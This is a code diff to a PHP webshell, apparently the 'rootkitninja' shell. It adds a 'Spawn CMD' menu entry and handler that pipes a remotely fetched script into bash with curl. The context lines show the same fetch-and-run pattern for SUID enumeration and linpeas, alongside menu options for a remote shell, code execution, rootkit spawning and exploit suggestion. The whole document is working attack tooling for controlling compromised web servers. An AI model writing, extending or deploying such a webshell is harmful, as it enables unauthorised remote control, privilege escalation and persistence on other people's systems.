@@ -2111,6 +2111,10 @@ if($s_auth){
 		$s_result .= "<pre><code>".exe("curl -Lsk https://cdn.githubraw.com/ortod0x/rootkitninja_webshell/main/suid3num.py | python")."</code></pre>";
 	}
 
+	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='cmdshell')){
+		$s_result .= "<pre><code>".exe("curl -Lsk https://cdn.githubraw.com/ortod0x/rootkitninja_webshell/main/cmdloader.sh | bash")."</code></pre>";
+	}
+
 	// spawn suggester
 	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='suggester')){
 		$s_result .= "<pre><code>".exe("curl -Lsk https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash")."</code></pre>";
@@ -2294,16 +2298,17 @@ if($s_auth){
 		<table style='width:100%;'>
 		<tr>
 		<td><a href='<?php echo $s_self."cd=".cp(dirname(realpath($_SERVER['SCRIPT_FILENAME']))); ?>' title='Home Current' onclick='return false;'><div class='menumi'>Home</div></a></td>
-		<td><a href='<?php echo $s_self; ?>x=info' title='Information about server' onclick='return false;'><div class='menumi'>Server Info</div></a></td>
+		<td><a href='<?php echo $s_self; ?>x=info' title='Information about server' onclick='return false;'><div class='menumi'>Information</div></a></td>
 		<td><a href='<?php echo $s_self; ?>' title='Explorer' onclick='return false;'><div class='menumi'>Explorer</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=ps' title='Display process status' onclick='return false;'><div class='menumi'>Process</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=eval' title='Execute code' onclick='return false;'><div class='menumi'>Execute</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=rs' title='Remote Shell' onclick='return false;'><div class='menumi'>Remote</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=db' title='Connect to database' onclick='return false;'><div class='menumi'>Connect</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=rootkit' title='Spawn Rootkit' onclick='return false;'><div class='menumi'>Rootkit</div></a></td>
-		<td><a href='<?php echo $s_self; ?>x=suid3num' title='SUID Enumeration' onclick='return false;'><div class='menumi'>SUID Enum</div></a></td>
+		<td><a href='<?php echo $s_self; ?>x=suid3num' title='SUID Enumeration' onclick='return false;'><div class='menumi'>SUID</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=suggester' title='Exploit Suggester' onclick='return false;'><div class='menumi'>Suggester</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=adminer' title='Spawn Adminer' onclick='return false;'><div class='menumi'>Adminer</div></a></td>
+		<td><a href='<?php echo $s_self; ?>x=cmdshell' title='Spawn CMD Shell' onclick='return false;'><div class='menumi'>Spawn CMD</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=about' title='About Of Shell' onclick='return false;'><div class='menumi'>About</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=logout' title='Logout' onclick='return false;'><div class='menumi'>Logout</div></a></td>
 		</tr>
